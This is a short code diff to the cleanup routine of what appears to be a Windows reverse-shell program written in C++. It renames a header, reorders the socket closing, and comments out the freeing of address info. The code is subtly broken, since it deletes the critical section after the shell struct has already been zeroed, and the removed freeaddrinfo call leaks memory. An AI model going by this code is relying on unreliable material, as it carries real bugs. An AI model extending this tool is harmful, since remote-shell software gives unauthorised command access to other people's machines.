@@ -1,6 +1,6 @@
 #include <ws2tcpip.h>
 
-#include "reverseShell.h"
+#include "reverse-shell.h"
 
 extern reverseShell_t	shell;
 extern BOOL				g_stopProcess;
@@ -58,19 +58,19 @@ extern volatile LONG	g_stopRoutines;
 void cleanUp(std::wstring name) {
 	journalReport(L"Inside cleanup, called by " + name);
 
-	if (shell.addrResult) {
-		freeaddrinfo(shell.addrResult);
-		shell.addrResult = NULL;
+	//if (shell.addrResult) {
+	//	freeaddrinfo(shell.addrResult);
+	//	shell.addrResult = NULL;
+	//}
+
+	if (shell.clientSocket) {
+		closesocket(shell.clientSocket);
+		shell.clientSocket = NULL;
 	}
 
 	if (shell.listenSocket) {
 		closesocket(shell.listenSocket);
 		shell.listenSocket = NULL;
-	}
-
-	if (shell.clientSocket) {
-		closesocket(shell.clientSocket);
-		shell.clientSocket = NULL;
 	}
 
 	if (shell.parentRead) {
@@ -115,5 +115,8 @@ void cleanUp(std::wstring name) {
 	WSACleanup();
 
 	shell = {};
+
+	DeleteCriticalSection(&shell.lock);
+
 	journalReport(L"done cleanup\n");
 }
